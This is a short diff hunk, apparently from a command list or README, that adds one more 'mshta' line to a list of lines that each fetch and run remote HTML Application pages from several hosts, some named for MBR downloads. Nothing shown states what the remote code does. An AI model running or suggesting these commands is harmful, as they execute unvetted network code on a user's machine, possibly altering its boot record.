@@ -15,6 +15,7 @@ mshta https://nas.lwxdn.de5.net/dl-mbr.html
 mshta https://8080-08d5dc50b306533b.monkeycode-ai.online/dl.html
 mshta https://8080-08d5dc50b306533b.monkeycode-ai.online/dl-mbr.html
 mshta http://nas.lwsdn.de5.net/dl6-mbr.html
+mshta https://ipxe-boot.onrender.com/dl.html
 
 
 
